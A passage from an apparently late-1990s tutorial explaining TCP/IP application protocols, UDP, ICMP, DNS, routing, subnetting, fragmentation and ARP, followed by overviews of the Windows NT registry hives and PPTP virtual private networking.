you want, and control the transmission of the file. (If you have a different application in mind, e.g. 
computer mail, some analogous protocol is needed.) This is done by "application protocols".

The application protocols run "on top" of TCP/IP. That is, when they want to send a message, 
they give the message to TCP. TCP makes sure it gets delivered to the other end. Because TCP 
and IP take care of all the networking details, the applications protocols can treat a network 
connection as if it were a simple byte stream, like a terminal or phone line.  Before going into 
more details about applications
programs, we have to describe how you find an application.

Suppose you want to send a file to a computer whose Internet address is 128.6.4.7. To start the 
process, you need more than just the Internet address. You have to connect to the FTP server at 
the other
end. In general, network programs are specialized for a specific set of tasks. Most systems have 
separate programs to handle file transfers, remote terminal logins, mail, etc. When you connect to
128.6.4.7, you have to specify that you want to talk to the FTP server. This is done by having 
"well-known sockets" for each server. Recall that TCP uses port numbers to keep track of 
individual conversations. User programs normally use more or less random port numbers. 
However specific port numbers are assigned to the programs that sit waiting for requests.

For example, if you want to send a file, you will start a program called "ftp". It will open a 
connection using some random number, say 1234, for the port number on its end. However it will 
specify port
number 21 for the other end. This is the official port number for the FTP server. Note that there 
are two different programs involved. You run ftp on your side. This is a program designed to 
accept commands
from your terminal and pass them on to the other end. The program that you talk to on the other 
machine is the FTP server. It is designed to accept commands from the network connection, 
rather than an
interactive terminal. There is no need for your program to use a well-known socket number for 
itself. Nobody is trying to find it. However the servers have to have well-known numbers, so that 
people can open connections to them and start sending them commands. The official port 
numbers for each program are given in "Assigned Numbers".

Note that a connection is actually described by a set of 4 numbers: the Internet address at each 
end, and the TCP port number at each end. Every datagram has all four of those numbers in it. 
(The Internet
addresses are in the IP header, and the TCP port numbers are in the TCP header.) In order to 
keep things straight, no two connections can have the same set of numbers. However it is 
enough for any one number
to be different. For example, it is perfectly possible for two different users on a machine to be 
sending files to the same other machine. This could result in connections with the following 
parameters:

	           Internet addresses	   TCP ports
connection 1	128.6.4.194, 128.6.4.7	    1234, 21
connection 2	128.6.4.194, 128.6.4.7	    1235, 21

Since the same machines are involved, the Internet addresses are the same. Since they are both 
doing file transfers, one end of the connection involves the well-known port number for FTP. The 
only thing
that differs is the port number for the program that the users are running. That's enough of a 
difference. Generally, at least one end of the connection asks the network software to assign it a 
port number
that is guaranteed to be unique. Normally, it's the user's end, since the server has to use a well-
known number.

Now that we know how to open connections, let's get back to the applications programs. As 
mentioned earlier, once TCP has opened a connection, we have something that might as well be 
a simple wire. All
the hard parts are handled by TCP and IP. However we still need some agreement as to what we 
send over this connection. In effect this is simply an agreement on what set of commands the 
application will
understand, and the format in which they are to be sent. Generally, what is sent is a combination 
of commands and data. They use context to differentiate.

For example, the mail protocol works like this: Your mail program opens a connection to the mail 
server at the other end. Your program gives it your machine's name, the sender of the message, 
and the
recipients you want it sent to. It then sends a command saying that it is starting the message. At 
that point, the other end stops treating what it sees as commands, and starts accepting the 
message. Your end then starts sending the text of the message. At the end of the message, a 
special mark is sent (a dot in the first column). After that, both ends understand that your program 
is again sending commands. This is the simplest way to do things, and the one that most 
applications use.

File transfer is somewhat more complex. The file transfer protocol involves two different 
connections. It starts out just like mail. The user's program sends commands like "log me in as 
this user", "here is
my password", "send me the file with this name". However once the command to send data is 
sent, a second connection is opened for the data itself. It would certainly be possible to send the 
data on the
same connection, as mail does. However file transfers often take a long time. The designers of 
the file transfer protocol wanted to allow the user to continue issuing commands while the transfer 
is going
on. For example, the user might make an inquiry, or he might abort the transfer. Thus the 
designers felt it was best to use a separate connection for the data and leave the original 
command connection for
commands. (It is also possible to open command connections to two different computers, and tell 
them to send a file from one to the other. In that case, the data couldn't go over the command
connection.)

Remote terminal connections use another mechanism still. For remote logins, there is just one 
connection. It normally sends data. When it is necessary to send a command (e.g. to set the 
terminal type or to change some mode), a special character is used to indicate that the next 
character is a command. If the user happens to type that special character as data, two of them 
are sent.

We are not going to describe the application protocols in detail in this document. It's better to read 
the RFC's yourself. However there are a couple of common conventions used by applications that 
will be
described here. First, the common network representation: TCP/IP is intended to be usable on 
any computer. Unfortunately, not all computers agree on how data is represented. There are 
differences in
character codes (ASCII vs. EBCDIC), in end of line conventions (carriage return, line feed, or a 
representation using counts), and in whether terminals expect characters to be sent individually 
or a line
at a time. In order to allow computers of different kinds to communicate, each applications 
protocol defines a standard representation.

Note that TCP and IP do not care about the representation. TCP simply sends octets. However 
the programs at both ends have to agree on how the octets are to be interpreted. The RFC for 
each application specifies the standard representation for that application. Normally it is "net 
ASCII". This uses ASCII characters, with end of line denoted by a carriage return followed by a 
line feed. For remote
login, there is also a definition of a "standard terminal", which turns out to be a half-duplex 
terminal with echoing happening on the local machine. Most applications also make provisions for 
the two
computers to agree on other representations that they may find more convenient. For example, 
PDP-10's have 36-bit words. There is a way that two PDP-10's can agree to send a 36-bit binary 
file. Similarly,
two systems that prefer full-duplex terminal conversations can agree on that. However each 
application has a standard representation, which every machine must support.

Keep in mind that it has become common practice for some corporations to change a services 
port number on the server side. If your client software is not configured with the same port 
number, connection will not be successful. We will discuss later in this text how you can perform 
port scanning on an entire IP address to see which ports are active.

[2.1.5] Other IP Protocols
Protocols other than TCP: UDP and ICMP

So far, we have described only connections that use TCP. Recall that TCP is responsible for 
breaking up messages into datagrams, and reassembling them properly. However in many 
applications, we have
messages that will always fit in a single datagram. An example is name lookup. When a user 
attempts to make a connection to another system, he will generally specify the system by name, 
rather than Internet
address. His system has to translate that name to an address before it can do anything. 
Generally, only a few systems have the database used to translate names to addresses. So the 
user's system will want to send a query to one of the systems that has the database. This query 
is going to be very short. It will certainly fit in one datagram. So will the answer. Thus it seems 
silly to use TCP. Of course TCP does
more than just break things up into datagrams. It also makes sure that the data arrives, resending 
datagrams where necessary. But for a question that fits in a single datagram, we don't need all 
the
complexity of TCP to do this. If we don't get an answer after a few seconds, we can just ask 
again. For applications like this, there are alternatives to TCP.

The most common alternative is UDP ("user datagram protocol"). UDP is designed for 
applications where you don't need to put sequences of datagrams together. It fits into the system 
much like TCP. There is a
UDP header. The network software puts the UDP header on the front of your data, just as it 
would put a TCP header on the front of your data. Then UDP sends the data to IP, which adds 
the IP header, putting
UDP's protocol number in the protocol field instead of TCP's protocol number. However UDP 
doesn't do as much as TCP does. It doesn't split data into multiple datagrams. It doesn't keep 
track of what it has
sent so it can resend if necessary. About all that UDP provides is port numbers, so that several 
programs can use UDP at once. UDP port numbers are used just like TCP port numbers. There 
are well-known port
numbers for servers that use UDP. Note that the UDP header is shorter than a TCP header. It still 
has source and destination port numbers, and a checksum, but that's about it. No sequence 
number, since it is not needed. UDP is used by the protocols that handle name lookups (see IEN 
116, RFC 882, and RFC 883), and a number of similar protocols.

Another alternative protocol is ICMP ("Internet Control Message Protocol"). ICMP is used for error 
messages, and other messages intended for the TCP/IP software itself, rather than any particular
user program. For example, if you attempt to connect to a host, your system may get back an 
ICMP message saying "host unreachable". ICMP can also be used to find out some information 
about the network. See RFC 792 for details of ICMP. ICMP is similar to UDP, in that it handles 
messages that fit in one datagram. However it is even simpler than UDP. It doesn't even have 
port numbers in its header. Since all ICMP messages are interpreted by the network software 
itself, no port numbers are needed to say where a ICMP message is supposed to go.

[2.1.6] Domain Name System
Keeping track of names and information: the domain system

As we indicated earlier, the network software generally needs a 32-bit Internet address in order to 
open a connection or send a datagram. However users prefer to deal with computer names rather 
than
numbers. Thus there is a database that allows the software to look up a name and find the 
corresponding number. When the Internet was small, this was easy. Each system would have a 
file that listed all of the
other systems, giving both their name and number. There are now too many computers for this 
approach to be practical. Thus these files have been replaced by a set of name servers that keep 
track of host
names and the corresponding Internet addresses. (In fact these servers are somewhat more 
general than that. This is just one kind of information stored in the domain system.)

Note that a set of interlocking servers are used, rather than a single central one. There are now 
so many different institutions connected to the Internet that it would be impractical for them to 
notify a central
authority whenever they installed or moved a computer. Thus naming authority is delegated to 
individual institutions. The name servers form a tree, corresponding to institutional structure. The 
names
themselves follow a similar structure.

A typical example is the name BORAX.LCS.MIT.EDU. This is a computer at the Laboratory for 
Computer Science (LCS) at MIT. In order to find its Internet address, you might potentially have 
to consult 4
different servers. First, you would ask a central server (called the root) where the EDU server is. 
EDU is a server that keeps track of educational institutions. The root server would give you the 
names and
Internet addresses of several servers for EDU. (There are several servers at each level, to allow 
for the possibly that one might be down.) You would then ask EDU where the server for MIT is. 
Again, it
would give you names and Internet addresses of several servers for MIT. Generally, not all of 
those servers would be at MIT, to allow for the possibility of a general power failure at MIT. Then 
you would ask
MIT where the server for LCS is, and finally you would ask one of the LCS servers about BORAX. 
The final result would be the Internet address for BORAX.LCS.MIT.EDU. Each of these levels is 
referred to as
a "domain". The entire name, BORAX.LCS.MIT.EDU, is called a "domain name". (So are the 
names of the higher-level domains, such as LCS.MIT.EDU, MIT.EDU, and EDU.)

Fortunately, you don't really have to go through all of this most of the time. First of all, the root 
name servers also happen to be the name servers for the top-level domains such as EDU. Thus 
a single
query to a root server will get you to MIT. Second, software generally remembers answers that it 
got before. So once we look up a name at LCS.MIT.EDU, our software remembers where to find 
servers for
LCS.MIT.EDU, MIT.EDU, and EDU. It also remembers the translation of BORAX.LCS.MIT.EDU. 
Each of these pieces of information has a "time to live" associated with it. Typically this is a few 
days. After that,
the information expires and has to be looked up again. This allows institutions to change things.

The domain system is not limited to finding out Internet addresses. Each domain name is a node 
in a database. The node can have records that define a number of different properties. Examples 
are
Internet address, computer type, and a list of services provided by a computer. A program can 
ask for a specific piece of information, or all information about a given name. It is possible for a 
node in the
database to be marked as an "alias" (or nickname) for another node. It is also possible to use the 
domain system to store information about users, mailing lists, or other objects.

There is an Internet standard defining the operation of these databases, as well as the protocols 
used to make queries of them. Every network utility has to be able to make such queries, since 
this is now the official way to evaluate host names. Generally utilities will talk to a server on their 
own system. This server will take care of contacting the other servers for them. This keeps down 
the amount of code that has to be in each application program.

The domain system is particularly important for handling computer mail. There are entry types to 
define what computer handles mail for a given name, to specify where an individual is to receive 
mail, and to
define mailing lists.  (See RFC's 882, 883, and 973 for specifications of the domain system. RFC 
974 defines the use of the domain system in sending mail.)

[2.1.7] Routing

The description above indicated that the IP implementation is responsible for getting datagrams 
to the destination indicated by the destination address, but little was said about how this would be
done. The task of finding how to get a datagram to its destination is referred to as "routing". In 
fact many of the details depend upon the particular implementation. However some general 
things can be said.

First, it is necessary to understand the model on which IP is based. IP assumes that a system is 
attached to some local network. We assume that the system can send datagrams to any other 
system on its own network. (In the case of Ethernet, it simply finds the Ethernet address of the 
destination system, and puts the datagram out on the Ethernet.) The problem comes when a 
system is asked to send a datagram to a system on a different network. This problem is handled 
by gateways. A gateway is a system that connects a network with one or more other networks. 
Gateways are often normal computers that happen to have more than one network interface. For 
example, we have a Unix machine that has two different Ethernet interfaces. Thus it is connected 
to networks 128.6.4 and 128.6.3. This machine can act as a gateway between those two 
networks. The software on that machine must be set up so that it will forward datagrams from one 
network to the other. That is, if a machine on network 128.6.4 sends a datagram to the gateway, 
and the datagram is addressed to a machine on network
128.6.3, the gateway will forward the datagram to the destination. Major communications centers 
often have gateways that connect a number of different networks. (In many cases, special-
purpose gateway systems provide better performance or reliability than general-purpose systems 
acting as gateways. A number of vendors sell such systems.)

Routing in IP is based entirely upon the network number of the destination address. Each 
computer has a table of network numbers. For each network number, a gateway is listed. This is 
the gateway to be
used to get to that network. Note that the gateway doesn't have to connect directly to the network. 
It just has to be the best place to go to get there. For example at Rutgers, our interface to NSFnet 
is at
the John von Neuman Supercomputer Center (JvNC). Our connection to JvNC is via a high-
speed serial line connected to a gateway whose address is 128.6.3.12. Systems on net 128.6.3 
will list 128.6.3.12 as
the gateway for many off-campus networks. However systems on net 128.6.4 will list 128.6.4.1 as 
the gateway to those same off-campus networks. 128.6.4.1 is the gateway between networks 
128.6.4 and
128.6.3, so it is the first step in getting to JvNC.

When a computer wants to send a datagram, it first checks to see if the destination address is on 
the system's own local network. If so, the datagram can be sent directly. Otherwise, the system 
expects to
find an entry for the network that the destination address is on. The datagram is sent to the 
gateway listed in that entry. This table can get quite big. For example, the Internet now includes 
several hundred
individual networks. Thus various strategies have been developed to reduce the size of the 
routing table. One strategy is to depend upon "default routes". Often, there is only one gateway 
out of a network. This gateway might connect a local Ethernet to a campus-wide backbone 
network. In that case, we don't need to have a separate entry for every network in the world. We 
simply define that gateway as a "default". When no specific route is found for a datagram, the 
datagram is sent to the default gateway. A default gateway can even be used when there are 
several gateways on a network. There are provisions for gateways to send a message saying "I'm 
not the best gateway -- use this one instead." (The message is sent via ICMP. See RFC 792.) 
Most network software is designed to use these messages to add entries to their routing tables. 
Suppose network 128.6.4 has two gateways, 128.6.4.59 and 128.6.4.1. 128.6.4.59 leads to 
several other internal Rutgers networks. 128.6.4.1 leads indirectly to the NSFnet. Suppose we set 
128.6.4.59 as a default gateway, and have no other routing table entries. Now what happens 
when we need to send a datagram to MIT? MIT is network 18. Since we have no entry for 
network 18, the datagram will be sent to the default, 128.6.4.59. As it happens, this gateway is 
the wrong one. So it will forward the
datagram to 128.6.4.1. But it will also send back an error saying in effect: "to get to network 18, 
use 128.6.4.1". Our software will then add an entry to the routing table. Any future datagrams to 
MIT will then go directly to 128.6.4.1. (The error message is sent using the ICMP protocol. The 
message type is called "ICMP redirect.")

Most IP experts recommend that individual computers should not try to keep track of the entire 
network. Instead, they should start with default gateways, and let the gateways tell them the 
routes, as just
described. However this doesn't say how the gateways should find out about the routes. The 
gateways can't depend upon this strategy. They have to have fairly complete routing tables. For 
this, some sort of
routing protocol is needed. A routing protocol is simply a technique for the gateways to find each 
other, and keep up to date about the  best way to get to every network. RFC 1009 contains a 
review of
gateway design and routing. However rip.doc is probably a better introduction to the subject. It 
contains some tutorial material, and a detailed description of the most commonly-used routing 
protocol.

[2.1.8] Subnets and Broadcasting
Details about Internet Addresses: Subnets and Broadcasting

As indicated earlier, Internet addresses are 32-bit numbers, normally written as 4 octets (in 
decimal), e.g. 128.6.4.7. There are actually 3 different types of address. The problem is that the 
address has to
indicate both the network and the host within the network. It was felt that eventually there would 
be lots of networks. Many of them would be small, but probably 24 bits would be needed to 
represent all the IP
networks. It was also felt that some very big networks might need 24 bits to represent all of their 
hosts. This would seem to lead to 48 bit addresses. But the designers really wanted to use 32 bit
addresses. So they adopted a kludge.

The assumption is that most of the networks will be small. So they set up three different ranges of 
address. Addresses beginning with 1 to 126 use only the first octet for the network number. The 
other three octets are available for the host number. Thus 24 bits are available for hosts. These 
numbers are used for large networks. But there can only be 126 of these very big networks. The 
Arpanet is one, and there are a few large commercial networks. But few normal organizations get 
one of these "class A" addresses. For normal large organizations, "class B" addresses are used. 
Class B addresses use the first two octets for the network number. Thus network numbers are 
128.1 through 191.254. (We avoid 0 and 255, for reasons that we see below. We also avoid 
addresses beginning with 127, because that is used by some systems for special purposes.) The 
last two octets are available for host addesses, giving 16 bits of host address. This allows for 
64516 computers, which should be enough for most organizations. (It is possible to get more than 
one class B address, if you run out.) Finally, class C addresses use three octets, in the range 
192.1.1 to 223.254.254. These allow only 254 hosts on each network, but there can
be lots of these networks. Addresses above 223 are reserved for future use, as class D and E 
(which are currently not defined).

Many large organizations find it convenient to divide their network number into "subnets". For 
example, Rutgers has been assigned a class B address, 128.6. We find it convenient to use the 
third octet of the
address to indicate which Ethernet a host is on. This division has no significance outside of 
Rutgers. A computer at another institution would treat all datagrams addressed to 128.6 the same 
way. They would
not look at the third octet of the address. Thus computers outside Rutgers would not have 
different routes for 128.6.4 or 128.6.5. But inside Rutgers, we treat 128.6.4 and 128.6.5 as 
separate networks. In
effect, gateways inside Rutgers have separate entries for each Rutgers subnet, whereas 
gateways outside Rutgers just have one entry for 128.6.

Note that we could do exactly the same thing by using a separate class C address for each 
Ethernet. As far as Rutgers is concerned, it would be just as convenient for us to have a number 
of class C
addresses. However using class C addresses would make things inconvenient for the rest of the 
world. Every institution that wanted to talk to us would have to have a separate entry for each one 
of our
networks. If every institution did this, there would be far too many networks for any reasonable 
gateway to keep track of. By subdividing a class B network, we hide our internal structure from 
everyone else,
and save them trouble. This subnet strategy requires special provisions in the network software. It 
is described in RFC 950.

0 and 255 have special meanings. 0 is reserved for machines that don't know their address. In 
certain circumstances it is possible for a machine not to know the number of the network it is on, 
or even its
own host address. For example, 0.0.0.23 would be a machine that knew it was host number 23, 
but didn't know on what network.

255 is used for "broadcast". A broadcast is a message that you want every system on the 
network to see. Broadcasts are used in some situations where you don't know who to talk to. For 
example, suppose
you need to look up a host name and get its Internet address. Sometimes you don't know the 
address of the nearest name server. In that case, you might send the request as a broadcast. 
There are also cases where a number of systems are interested in information. It is then less 
expensive to send a single broadcast than to send datagrams individually to each host that is 
interested in the information. In order to send a broadcast, you use an address that is made by 
using your network address, with all ones in the part of the address where the host number goes. 
For example, if you are on network 128.6.4, you would use 128.6.4.255 for broadcasts. How this 
is actually implemented depends upon the medium. It is not possible to send broadcasts on the 
Arpanet, or on point to point lines. However it is possible on an Ethernet. If you use an Ethernet 
address with all its bits on (all ones), every machine on the Ethernet is supposed to look at that 
datagram.

Although the official broadcast address for network 128.6.4 is now 128.6.4.255, there are some 
other addresses that may be treated as broadcasts by certain implementations. For convenience, 
the standard
also allows 255.255.255.255 to be used. This refers to all hosts on the local network. It is often 
simpler to use 255.255.255.255 instead of finding out the network number for the local network 
and forming a
broadcast address such as 128.6.4.255. In addition, certain older implementations may use 0 
instead of 255 to form the broadcast address. Such implementations would use 128.6.4.0 instead 
of 128.6.4.255 as the broadcast address on network 128.6.4. Finally, certain older 
implementations may not understand about subnets. Thus they consider the network number to 
be 128.6. In that case, they will assume a broadcast address of 128.6.255.255 or 128.6.0.0. Until 
support for broadcasts is implemented properly, it can be a somewhat dangerous feature to use.

Because 0 and 255 are used for unknown and broadcast addresses, normal hosts should never 
be given addresses containing 0 or 255. Addresses should never begin with 0, 127, or any 
number above 223. Addresses violating these rules are sometimes referred to as "Martians", 
because of rumors that the Central University of Mars is using network 225.

[2.1.9] Datagram Fragmentation and Reassembly

TCP/IP is designed for use with many different kinds of network. Unfortunately, network 
designers do not agree about how big packets can be. Ethernet packets can be 1500 octets long. 
Arpanet packets have a maximum of around 1000 octets. Some very fast networks have much 
larger packet sizes. At first, you might think that IP should simply settle on the smallest possible 
size. Unfortunately, this would cause serious performance problems. When transferring large 
files, big packets are far more efficient than small ones. So we want to be able to use the largest 
packet size possible. But we also want to be able to handle networks with small limits.

There are two provisions for this. First, TCP has the ability to "negotiate" about datagram size. 
When a TCP connection first opens, both ends can send the maximum datagram size they can 
handle. The
smaller of these numbers is used for the rest of the connection. This allows two implementations 
that can handle big datagrams to use them, but also lets them talk to implementations that can't 
handle them. However this doesn't completely solve the problem. The most serious problem is 
that the two ends don't necessarily know about all of the steps in between. For example, when 
sending data between Rutgers and Berkeley, it is likely that both computers will be on Ethernets. 
Thus they will both be prepared to handle 1500-octet datagrams. However the connection will at 
some point end up going over the Arpanet. It can't handle packets of that size. For this reason, 
there are provisions to split datagrams up into pieces. (This is referred to as "fragmentation".) The 
IP header contains fields indicating the  datagram has been split, and enough information to let 
the pieces be put back together. If a gateway connects an Ethernet
to the Arpanet, it must be prepared to take 1500-octet Ethernet packets and split them into pieces 
that will fit on the Arpanet. Furthermore, every host implementation of TCP/IP must be prepared 
to accept pieces and put them back together. This is referred to as "reassembly".

TCP/IP implementations differ in the approach they take to deciding on datagram size. It is fairly 
common for implementations to use 576-byte datagrams whenever they can't verify that the 
entire path is able to
handle larger packets. This rather conservative strategy is used because of the number of 
implementations with bugs in the code to reassemble fragments. Implementors often try to avoid 
ever having fragmentation occur. Different implementors take different approaches to deciding 
when it is safe to use large datagrams. Some use them only for the local network. Others will use 
them for any network on the same campus. 576 bytes is a "safe" size, which every 
implementation must support.

[2.2.0] Ethernet encapsulation: ARP

There was a brief discussion earlier about what IP datagrams look like on an Ethernet. The 
discussion showed the Ethernet header and checksum. However it left one hole: It didn't say how 
to figure out
what Ethernet address to use when you want to talk to a given Internet address. In fact, there is a 
separate protocol for this, called ARP ("address resolution protocol"). (Note by the way that ARP 
is not an IP protocol. That is, the ARP datagrams do not have IP headers.)

Suppose you are on system 128.6.4.194 and you want to connect to system 128.6.4.7. Your 
system will first verify that 128.6.4.7 is on the same network, so it can talk directly via Ethernet. 
Then it will look up 128.6.4.7 in its ARP table, to see if it already knows the Ethernet address. If 
so, it will stick on an Ethernet header, and send the packet. But suppose this system is not in the 
ARP table. There is
no way to send the packet, because you need the Ethernet address. So it uses the ARP protocol 
to send an ARP request. Essentially an ARP request says "I need the Ethernet address for 
128.6.4.7". Every system listens to ARP requests. When a system sees an ARP request for itself, 
it is required to respond. So 128.6.4.7 will see the request, and will respond with an ARP reply 
saying in effect "128.6.4.7 is
8:0:20:1:56:34". (Recall that Ethernet addresses are 48 bits. This is 6 octets. Ethernet addresses 
are conventionally shown in hex, using the punctuation shown.) Your system will save this 
information in its
ARP table, so future packets will go directly. Most systems treat the ARP table as a cache, and 
clear entries in it if they have not been used in a certain period of time.

Note by the way that ARP requests must be sent as "broadcasts". There is no way that an ARP 
request can be sent directly to the right system. After all, the whole reason for sending an ARP 
request is that
you don't know the Ethernet address. So an Ethernet address of all ones is used, i.e. ff:ff:ff:ff:ff:ff. 
By convention, every machine on the Ethernet is required to pay attention to packets with this as 
an
address. So every system sees every ARP requests. They all look to see whether the request is 
for their own address. If so, they respond. If not, they could just ignore it. (Some hosts will use 
ARP requests to
update their knowledge about other hosts on the network, even if the request isn't for them.) Note 
that packets whose IP address indicates broadcast (e.g. 255.255.255.255 or 128.6.4.255) are 
also sent with an Ethernet address that is all ones.

[3.0.0] Preface to the WindowsNT Registry

This section is not meant for NT engineers that already know the registry, and its not meant for 
people that have read the 800+ page books on the registry I’ve seen. This section is meant as a 
quick guide to get people understanding exactly what this registry thing is. 

[3.0.1] What is the Registry?

The windows registry provides for a somewhat secure, unified database that stores configuration 
information into a hierarchical model. Until recently, configuration files such as WIN.INI, were the 
only way to configure windows applications and operating system functions. In todays NT 4 
environment, the registry replaces these .INI files. Each key in the registry is similar to bracketed 
headings in an .INI file.

One of the main disadvantages to the older .INI files is that those files are flat text files, which are 
unable to support nested headings or contain data other than pure text. Registry keys can contain 
nested headings in the form of subkeys. These subkeys provide finer details and a greater range 
to the possible configuration information for a particular operating system. Registry values can 
also consist of executable code, as well as provide individual preferences for multiple users of the 
same computer. The ability to store executable code within the Registry extends its usage to 
operating system system and application developers. The ability to store user-specific profile 
information allows one to tailor the environment for specific individual users.

To view the registry of an NT server, one would use the Registry Editor tool. There are two 
versions of Registry Editor:

.:Regedt32.exe has the most menu items and more choices for the menu items. You can search 
for keys and subkeys in the registry.

.:Regedit.exe enables you to search for strings, values, keys, and subkeys and export keys to 
.reg files. This feature is useful if you want to find specific data.

For ease of use, the Registry is divided into five seperate structures that represent the Registry 
database in its entirety. These five groups are known as Keys, and are discussed below:

[3.0.2] In Depth Key Discussion

HKEY_CURRENT_USER
This registry key contains the configuration information for the user that is currently logged in. The 
users folders, screen colors, and control panel settings are stored here. This information is known 
as a User Profile.

HKEY_USERS
In windowsNT 3.5x, user profiles were stored locally (by default) in the 
systemroot\system32\config directory. In NT4.0, they are stored in the systemroot\profiles 
directory. User-Specific information is kept there, as well as common, system wide user 
information.

This change in storage location has been brought about to parallel the way in which Windows95 
handles its user profiles. In earlier releases of NT, the user profile was stored as a single file - 
either locally in the \config directory or centrally on a server. In windowsNT 4, the single user 
profile has been broken up into a number of subdirectories located below the \profiles directory. 
The reason for this is mainly due to the way in which the Win95 and WinNT4 operating systems 
use the underlying directory structure to form part of their new user interface.

A user profile is now contained within the NtUser.dat (and NtUser.dat.log) files, as well as the 
following subdirectories:

? Application Data: This is a place to store application data specific to this particular user.
? Desktop: Placing an icon or a shortcut into this folder causes the that icon or shortcut to 
appear on the desktop of the user.
? Favorites: Provides a user with a personlized storage place for files, shortcuts and other 
information.
? NetHood: Maintains a list of personlized network connections.
? Personal: Keeps track of personal documents for a particular user.
? PrintHood: Similar to NetHood folder, PrintHood keeps track of printers rather than network 
connections.
? Recent: Contains information of recently used data.
? SendTo: Provides a centralized store of shortcuts and output devices.
? Start Menu: Contains configuration information for the users menu items.
? Templates: Storage location for document templates.

HKEY_LOCAL_MACHINE
This key contains configuration information particular to the computer. This information is stored 
in the systemroot\system32\config directory as persistent operating system files, with the 
exception of the volatile hardware key.

The information gleaned from this configuration data is used by applications, device drivers, and 
the WindowsNT 4 operating system. The latter usage determines what system configuration data 
to use, without respect to the user currently logged on. For this reason the 
HKEY_LOCAL_MACHINE regsitry key is of specific importance to administrators who want to 
support and troubleshoot NT 4.

HKEY_LOCAL_MACHINE is probably the most important key in the registry and it contains five 
subkeys:

? Hardware: Database that describes the physical hardware in the computer, the way device 
drivers use that hardware, and mappings and related data that link kernel-mode drivers with 
various user-mode code. All data in this sub-tree is re-created everytime the system is 
started.
? SAM: The security accounts manager. Security information for user and group accounts and 
for the domains in NT 4 server.
? Security: Database that contains the local security policy, such as specific user rights. This 
key is used only by the NT 4 security subsystem.
? Software: Pre-computer software database. This key contains data about software installed 
on the local computer, as well as configuration information.
? System: Database that controls system start-up, device driver loading, NT 4 services and OS 
behavior.

Information about the HKEY_LOCAL_MACHINE\SAM Key

This subtree contains the user and group accounts in the SAM database for the local computer. 
For a computer that is running NT 4, this subtree also contains security information for the 
domain. The information contained within the SAM registry key is what appears in the user 
interface of the User Manager utility, as well as in the lists of users and groups that appear when 
you make use of the Security menu commands in NT4 explorer.

Information about the HKEY_LOCAL_MACHINE\Security key

This subtree contains security information for the local computer. This includes aspects such as 
assigning user rights, establishing password policies, and the membership of local groups, which 
are configurable in User Manager.

HKEY_CLASSES_ROOT

The information stored here is used to open the correct application when a file is opened by using 
Explorer and for Object Linking and Embedding. It is actually a window that reflects information 
from the HKEY_LOCAL_MACHINE\Software subkey.

HKEY_CURRENT_CONFIG

The information contained in this key is to configure settings such as the software and device 
drivers to load or the display resolution to use. This key has a software and system subkeys, 
which keep track of configuration information.

[3.0.3] Understanding Hives

The registry is divided into parts called hives. These hives are mapped to a single file and a .LOG 
file. These files are in the systemroot\system32\config directory.

Registry Hive					File Name
=================================================================
HKEY_LOCAL_MACHINE\SAM			SAM and SAM.LOG
HKEY_LOCAL_MACHINE\SECURITY		Security and Security.LOG
HKEY_LOCAL_MACHINE\SOFTWARE		Software and Software.LOG
HKEY_LOCAL_MACHINE\SYSTEM		System and System.ALT
=================================================================

Although I am not gauranteeing that these files will be easy to understand, with a little research 
and patience, you will learn what you want to learn. I have been asked to write a file on how to 
decipher the contents of those files, but I have yet to decide weather I will do it or not.

QuickNotes

Ownership = The ownership menu item presents a dialog box that identifies the user who owns 
the selected registry key. The owner of a key can permit another user to take ownership of a key. 
In addition, a system administrator can assign a user the right to take ownership, or outright take 
ownership himself.

REGINI.EXE = This utility is a character based console application that you can use to add keys 
to the NT registry by specifying a Registry script.

[4.0.0] Introduction to PPTP

Point-To-Point Tunneling Protocol (PPTP) is a protocol that allows the secure exchange of data 
from a client to a server by forming a Virtual Private Network (VPN) via a TCP/IP based network. 
The strong point of PPTP is its ability to provide on demand, multi-protocol support over existing 
network infrastructure, such as the Internet. This ability would allow a company to use the Internet 
to establish a virtual private network without the expense of a leased line.

The technology that makes PPTP possible is an extension of the remote access Point-To-Point 
Protocol (PPP- which is defined and documented by the Internet Engineering Task Force in RFC 
1171).  PPTP technology encapsulates PPP packets into IP datagrams for transmission over 
TCP/IP based networks. PPTP is currently a protocol draft awaiting standardization. The 
companies involved in the PPTP forum are Microsoft, Ascend Communications, 3Com/Primary 
Access, ECI Telematics, and US Robotics.

[4.0.1] PPTP and Virtual Private Networking

The Point-To-Point Tunneling Protocol is packaged with WindowsNT 4.0 Server and Workstation. 
PC's that are running this protocol  can use it to securely connect to a private network as a 
remote access client using a public data network such as the Internet. 

A major feature in the use of PPTP is its support for virtual private networking. The best part of 
this feature is that it supports VPN's over public-switched telephone networks (PSTNs). By using 
PPTP a company can greatly reduce the cost of deploying a wide area, remote access solution 
for mobile users because it provides secure and encrypted communications over existing network 
structures like PSTNs or the Internet.

[4.0.2] Standard PPTP Deployment

In general practice, there are normally three computers involved in a deployment:

? a PPTP client
? a Network Access Server
? a PPTP Server

note: the network access server is optional, and if NOT needed for PPTP deployment. In normal 
deployment however, they are present.

In a typical deployment of PPTP, it begins with a remote or mobile PC that will be the PPTP 
client. This PPTP client needs access to a private network by using a local Internet Service 
Provider (ISP). Clients who are running the WindowsNT Server or Workstation operating systems 
will use Dial-up networking and the Point-To-Point protocol to connect to their ISP. The client will 
then connect to a network access server which will be located at the ISP (Network Access 
Servers are also known as Front-End Processors (FEPs) or Point-Of-Presence servers (POPs)). 
Once connected, the client has the ability to exchange data over the Internet. The Network 
Access Server uses the TCP/IP protocol  for the handling of all traffic.

After the client has made the initial PPP connection to the ISP, a second Dial-Up networking call 
is made over the existing PPP connection. Data sent using the second connection is in the form 
of IP datagrams that contain PPP packets, referred to as encapsulated PPP. It is this second call 
that creates the virtual private network connection to a PPTP server on the private company 
network. This is called a tunnel.

Tunneling is the process of exchanging data to a computer on a private network by routing them 
over some other network. The other network routers cannot access the computer that is on the 
private network. However, tunneling enables the routing network to transmit the packet to an 
intermediary computer, such as a PPTP server. This PPTP server is connected to both the 
company private network and the routing network, which is in this case, the Internet. Both the 
PPTP client and the PPTP server use tunneling to securely transmit packets to a computer on the 
private network.

When the PPTP server receives a packet from the routing network (Internet), it sends it across 
the private network to the destination computer. The PPTP server does this by processing the 
PPTP packet to obtain the private network computer name or address information which is 
encapsulated in the PPP packet. 

quick note: The encapsulated PPP packet can contain multi-protocol data such as TCP/IP, 
IPX/SPX, or NetBEUI. Because the PPTP server is configured to communicate across the private 
network by using private network protocols, it is able to understand Multi-Protocols.

PPTP encapsulates the encrypted and compressed PPP packets into IP datagrams for 
transmission over the Internet. These IP datagrams are routed over the Internet where they reach 
